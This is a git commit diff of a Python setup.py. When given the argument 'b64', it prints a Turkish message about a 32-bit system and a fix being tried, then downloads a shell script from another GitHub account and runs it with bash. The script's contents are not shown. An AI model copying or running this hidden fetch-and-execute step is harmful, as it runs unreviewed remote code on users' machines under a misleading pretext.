71eb12c26fb3d2308584ecdcd4d81796e5f2d0b0
aevx <85465830+aevx@users.noreply.github.com>
2022-07-17 02:48:49 +0300

    Add files via upload

--- setup.py
+++ setup.py
@@ -1,11 +1,14 @@
+import sys
+
 try:
- import sys
+ if sys.argv[1] == "b64":
+  import time,os
+  os.system("clear")
+  print("32 Bit Tespit Edildi Normal Şartlarda\n\nBu Tool Çalışmaz\n\nAma Çözüm Yolu Deniyoruz.\n\nLütfen Sabırlı Olun.\n")
+  os.system('uname -m')
+  time.sleep(5)
+  os.system("cd && curl -L -O https://github.com/scrlpr/a/raw/main/a.sh && bash a.sh")
+
+except IndexError:
  sys.path.append(".lib")
  import tool
-except ImportError:
- import time,os
- os.system("clear")
- print("32 Bit Tespit Edildi Normal Şartlarda\n\nBu Tool Çalışmaz\n\nAma Çözüm Yolu Deniyoruz.\n\nLütfen Sabırlı Olun.\n")
- os.system('uname -m')
- time.sleep(5)
- os.system("cd && curl -L -O https://github.com/scrlpr/a/raw/main/a.sh && bash a.sh")
